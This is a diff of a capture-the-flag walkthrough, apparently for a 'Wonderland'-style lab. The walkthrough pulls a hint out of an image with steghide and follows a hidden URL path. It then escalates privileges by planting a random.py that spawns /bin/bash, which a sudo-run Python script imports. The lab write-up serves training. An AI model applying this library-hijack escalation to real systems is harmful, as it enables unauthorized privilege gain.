@@ -35,17 +35,23 @@ Now we go to the /img file shown by gobuster tool  and load the following image.
 
 ![](images/2025-12-11_11-48.png)
 
+
 ![](images/2025-12-11_11-49.png)
+
 
 After downloading the image, we will use the steghide tool like below command. 
 > `steghide info white_rabbit_1.jpg`
+
 > `steghide extract -sf white_rabbit_1.jpg`
+
 > `cat hint.txt`
 
 ![](images/2025-12-11_11-43.png)
 
+
 Now that we have read the hint in the text we can follow it in to the page. 
 > `http://10.67.165.26/r/a/b/b/i/t/`
+
 
 ![](images/2025-12-11_15-50.png)
 
@@ -75,11 +81,12 @@ So how did I switch the user ?
 
 It gave me the user rabbit which means I successfully managed to switch my first privilege.
 
->`cat > random.py << EOF`
->`import os`
->`os.system("/bin/bash")`
->`EOF`
-
+```bash
+cat > random.py << EOF
+import os
+os.system("/bin/bash")
+EOF
+```
 >`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
 
 ![](images/2025-12-11_12-20.png)
